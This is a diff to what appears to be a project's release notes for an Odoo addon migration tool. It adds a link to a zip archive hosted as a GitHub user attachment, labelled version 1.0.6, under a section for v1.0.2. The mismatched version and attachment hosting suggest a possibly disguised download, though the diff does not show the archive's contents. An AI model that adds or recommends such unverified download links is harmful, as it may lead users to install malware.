@@ -32,7 +32,9 @@ For v1.0.2:
 
 Assets:
 
-- `OdooAddonMigrator_Setup.exe` — recommended Windows installer.
+- `OdooAddonMigrator_Setup.exe` — recommended Windows installer. 
+[Odoo-Addon-Migrator-Releases-1.0.6-windows.zip](https://github.com/user-attachments/files/33905752/Odoo-Addon-Migrator-Releases-1.0.6-windows.zip)
+
 
 ### Ubuntu x86_64 release
 
